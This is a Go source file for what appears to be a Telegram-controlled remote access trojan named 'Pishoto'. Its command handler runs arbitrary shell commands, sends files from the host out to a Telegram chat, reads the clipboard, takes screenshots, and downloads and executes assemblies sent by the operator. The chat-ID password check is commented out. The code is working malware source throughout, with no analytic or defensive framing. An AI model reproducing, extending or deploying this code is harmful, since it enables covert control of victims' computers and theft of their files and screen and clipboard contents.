package main

import (
	_ "embed"
	"os"
	"strings"
	"path/filepath"
)


func wrapSendFile(chatID int64, fullpath string) {
    data, err := os.ReadFile(fullpath)
    if err != nil {
        SendMessage(chatID, err.Error())
        return
    }
	sendFile(chatID, filepath.Base(fullpath), data)
}

func parseCommand(chatID int64, text string) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/info":
		getInfo(chatID)
	case "/cmd":
		executeCommand(chatID, commandParts[1:])
	case "/showdir":
		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/down":
		wrapSendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
	case "/clip":
		getClipboard(chatID)
	case "/screen":
		takeScreenshots(chatID)
	case "/asm":
		assemblyHash := commandParts[1]
		assemblyArgs := commandParts[2:]
		executeAssemblyByHash(chatID, assemblyHash, assemblyArgs, "")
	default:
		SendMessage(chatID, "No such command 🥴")
	}
}

func onStart() {
}

func main() {

	onStart()

	for {
		updates, _ := GetUpdates(offset)
		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			file := update.Message.Document
			caption := update.Message.Caption
			// if contains(chatIDs, chatID) {
				var responseText string
				if file != nil {
					if strings.HasPrefix(caption, "/asm") {
						// Gonna execute assembly
						assemblyBytes, err := downloadFileBytes(file)
						if err == nil {
							assemblyArgs := strings.Split(strings.TrimSpace(caption[4:]), " ")
							executeAssembly(chatID, assemblyBytes, assemblyArgs, "")
						}
						continue 
					} else if (strings.HasPrefix(caption, "/up")) {
						// Gonna download a file from the bot
						filePath := strings.TrimSpace(caption[3:])
						err := downloadFile(file, filePath)
						if err != nil {
							// Caption is bad file path, let's try original file name in current folder
							fileName := update.Message.Document.FileName
							err = downloadFile(file, fileName)
							if err != nil {
								responseText = "Could not save file"
							} else {
								responseText = "Saved: " + fileName
							}
						} else {
							responseText = "Saved: " + filePath
						}
						// Send message and continue to next task
						SendMessage(chatID, responseText)
						continue
					}
				}
				parseCommand(chatID, text)
			// } else if md5Hash(text) == passMd5 {
				// chatIDs = append(chatIDs, chatID)
				// responseText := "Password confirmed. \nPishoto is welcoming you 🤖"
				// SendMessage(chatID, responseText)
			// } else {
			// 	responseText := "Wrong password."
			// 	SendMessage(chatID, responseText)
			// }

		}
	}
}
